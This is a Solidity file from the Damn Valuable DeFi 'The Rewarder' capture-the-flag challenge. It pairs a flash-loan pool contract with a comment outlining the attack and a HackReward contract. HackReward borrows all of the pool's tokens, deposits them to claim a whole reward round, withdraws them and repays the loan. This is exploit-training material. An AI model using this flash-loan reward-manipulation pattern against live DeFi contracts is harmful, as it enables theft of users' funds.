pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @notice A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {

    using Address for address payable;

    DamnValuableToken public liquidityToken;

    constructor(address liquidityTokenAddress) public {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    /**+-We can Attack the "TheRewarderPool" S.C. and Claim ALL the rewards of the
    Next Round of Rewards by waiting for the Next Round of Reward to Start, and once
    it does we take a FlashLoan for all the DVTokens inside THIS S.C., and then we
    deposit it in the "TheRewarderPool" S.C., this will trigger the "distributeRewards()"
    back to us, meaning that we will get all of the Rewards from this Round, and after
    we Claim the Rewards we IMMEDIATELY Call "withdrawal(ammountToWithDraw)".*/
    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(msg.sender.isContract(), "Borrower must be a deployed contract");

        liquidityToken.transfer(msg.sender, amount);

        (bool success, ) = msg.sender.call(
            abi.encodeWithSignature(
                "receiveFlashLoan(uint256)",
                amount
            )
        );
        require(success, "External call failed");

        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    }
}

import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract HackReward {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public reward;

    constructor(address _pool, address _token, address _rewardPool, address _reward) public {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        reward = RewardToken(_reward);
    }

    fallback() external {
        uint bal = token.balanceOf(address(this));

        token.approve(address(rewardPool), bal);
        rewardPool.deposit(bal);
        rewardPool.withdraw(bal);

        token.transfer(address(pool), bal);
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}